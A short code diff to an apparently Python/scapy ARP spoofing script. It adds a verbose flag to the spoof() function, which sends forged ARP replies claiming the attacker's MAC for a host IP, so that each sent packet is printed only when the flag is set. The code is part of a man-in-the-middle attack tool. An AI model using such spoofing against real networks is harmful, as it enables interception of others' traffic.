@@ -55,9 +55,10 @@ def enable_ip_routing():
     print("[*] IP routing enabled.")
 
 
-def spoof(target, host):
+def spoof(target, host, verbose=False):
     """
     Spoofs target IP by saying the attacker is the host IP
+    :param verbose: Print out every sent packet. Default: FALSE
     :param target: Target of this spoof. Who are we reaching?
     :param host: IP the attacker is spoofing. Who are we?
     """
@@ -71,7 +72,8 @@ def spoof(target, host):
     send(arp_response, verbose=0)
 
     self_mac = ARP().hwsrc
-    print("[->] Sent to {} : {} is-at {}".format(target, host, self_mac))
+    if verbose:
+        print("[->] Sent to {} : {} is-at {}".format(target, host, self_mac))
 
 
 def restore(target, host):
